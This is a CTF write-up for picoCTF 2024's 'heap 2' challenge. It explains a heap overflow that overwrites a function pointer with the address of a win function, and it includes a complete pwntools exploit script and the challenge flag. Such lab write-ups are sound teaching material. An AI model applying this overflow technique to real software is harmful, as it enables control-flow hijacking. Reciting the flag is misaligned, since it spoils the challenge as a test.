# heap 2 #
 
## Overview ##

Category: [Binary Exploitation](../../)

Topics: Binary Exploitation, picoCTF-2024, Heap Overflow

## Description ##
Can you handle function pointers?

## Approach ##
I am provided with a binary file called `chall` and a C file called `chall.c`. Inspecting the C file, I see there is a `win` function that prints the flag, `check_win` function that performs an indirect call using memory address (which is `x`), and the rest of the code function similarly to the previous challenge (heap 1). The value stored at the memory location pointed to by `x` is "bico".

Since `check_win` dereferences the pointer `x`, casts the resulting value to a function pointer, and invokes it, overwriting the value stored at `x` with the address of `win` allows control flow to be redirected and the flag to be printed. I first check for enabled security features using `checksec` and see that PIE is disabled:

    Arch:     amd64
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes

With this in mind, I then `objdump -d chall` to find the address of the `win` function, which is `0x4011a0`:

    00000000004011a0 <win>:
    4011a0:       53                      push   %rbx
                   .
                   .
                   .
    4011ec:       0f 1f 40 00             nopl   0x0(%rax)

Now that I got all the necessary information, I can start writing the exploit:

    from pwn import *

    HOST = 'mimas.picoctf.net'
    PORT = 63502

    p = remote(HOST, PORT)

    # Wait until program print "Enter your choice", then send "1"
    p.sendlineafter(b'Enter your choice:', b'1')

    p.recvline() # Skip [*]   Address   ->   Value
    p.recvline() # Skip +-------------+-----------+

    # Get the memory address of the user input
    input_data_addr = p.recvline().decode() 
    input_data_addr = int(input_data_addr.split()[1], 16)

    # Skip +-------------+-----------+
    p.recvline()

    # Get the memory address of x
    x_addr = p.recvline().decode() 
    x_addr = int(x_addr.split()[1], 16)

    win_addr = 0x4011a0

    # Calculate the padding
    padding = x_addr - input_data_addr

    # Payload used for overwriting the value at x to be memory address of win
    payload = b'a'*padding + p64(win_addr)

    # Overwrite value at x
    p.sendline(b'2')
    p.sendline(payload)

    p.sendline(b'4')

    p.interactive()

Running the script, I got the flag:

    Enter your choice: picoCTF{and_down_the_road_we_go_dde41590}

When I print the heap, I can also see that I successfully overflowed the heap and changed the value of `x` to the address of the `win` function:

    [*]   Address   ->   Value
    +-------------+-----------+
    [*]   0x5e52b0  ->   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa0\x11@
    +-------------+-----------+
    [*]   0x5e52d0  ->   \xa0\x11@

Flag: picoCTF{and_down_the_road_we_go_dde41590}

## Reflection ## 
This challenge isn't much difference from the previous one, since the program still leaks the memory address of the user input and the memory address of `x`. I can still calculate the offset and overflow the heap to change the value of `x` to the address of the `win` function. This challenge yet again shows that heap overflow is possible if function that don't check for bounds are used. 



